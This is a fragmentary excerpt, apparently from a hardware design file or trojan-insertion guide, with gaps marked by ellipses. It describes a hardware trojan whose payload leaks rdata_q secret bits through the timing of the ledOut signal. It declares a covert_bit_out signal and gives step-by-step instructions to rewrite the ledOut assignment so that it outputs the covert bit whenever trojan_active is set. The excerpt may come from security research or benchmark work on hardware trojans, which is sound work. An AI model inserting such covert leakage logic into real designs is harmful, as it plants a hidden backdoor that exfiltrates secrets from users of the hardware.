 ...
 * Payload: Modulate ledOut timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of ledOut:
...
logic       covert_bit_out;         // Drives ledOut when trojan active
...
//   Find the assign for ledOut (or rd_error_o as fallback):
//     assign ledOut = <normal_expr>;
//   Replace with:
//     assign ledOut = trojan_active ? covert_bit_out : (<normal_expr>);
//
